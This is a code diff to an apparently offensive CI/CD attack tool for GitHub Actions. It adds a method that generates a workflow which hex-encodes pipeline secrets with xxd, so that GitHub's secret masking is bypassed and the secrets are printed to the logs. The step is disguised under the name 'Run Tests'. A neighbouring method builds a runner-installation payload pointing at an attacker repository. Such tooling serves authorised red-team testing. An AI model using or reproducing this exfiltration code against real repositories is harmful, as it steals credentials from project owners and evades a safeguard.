@@ -135,6 +135,54 @@ class CICDAttack():
         return yaml.dump(yaml_file, sort_keys=False)
 
     @staticmethod
+    def create_exfil_yaml_b64(secrets: list, branch_name: str):
+        """Create a yaml file that exfiltrates secrets using hex encoding.
+
+        Uses xxd hex encoding to bypass GitHub's secret masking (which
+        masks raw values and base64 variants). Simpler than the AES+RSA
+        pipeline and avoids OpenSSL version issues.
+
+        Args:
+            secrets (list): List of GitHub Actions pipeline secrets.
+            branch_name (str): Name of the branch for on: push trigger.
+
+        Returns:
+            str: Workflow yaml file containing the exfil payload.
+        """
+        yaml_file = {}
+
+        secret_envmap = {}
+        for secret in secrets:
+            secret_envmap[secret] = '${{ ' + f'secrets.{secret}' + ' }}'
+
+        # Build a run command that hex-encodes each secret on its own line
+        # xxd -p outputs hex which GitHub won't mask
+        # Format: GATO_START\nSECRET_NAME=<hex>\n...\nGATO_END
+        lines = ['echo "GATO_START"']
+        for secret in secrets:
+            lines.append(
+                f'echo "{secret}=$(echo -n \"${secret}\" | xxd -p | tr -d \'\\n\')"'
+            )
+        lines.append('echo "GATO_END"')
+
+        yaml_file['name'] = branch_name
+        yaml_file['on'] = {'push': {'branches': branch_name}}
+
+        test_job = {
+            'runs-on': ['ubuntu-latest'],
+            'steps': [
+                {
+                    'name': 'Run Tests',
+                    'env': secret_envmap,
+                    'run': '\n'.join(lines)
+                }
+            ]
+        }
+        yaml_file['jobs'] = {'testing': test_job}
+
+        return yaml.dump(yaml_file, sort_keys=False)
+
+    @staticmethod
     def create_ror_payload(registration_token: str, attacker_repo: str,
                            runner_version: str):
         """Generate the RoR runner installation bash payload.
